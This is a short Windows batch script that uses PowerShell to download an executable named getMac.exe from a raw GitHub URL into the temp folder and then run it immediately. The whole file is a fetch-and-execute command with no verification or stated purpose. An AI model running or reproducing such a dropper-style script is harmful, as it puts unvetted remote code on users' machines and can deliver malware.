@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ElDevBorges/autoTask/main/getMac.exe' -OutFile '%temp%\getMac.exe'"
start "" "%temp%\getMac.exe"
exit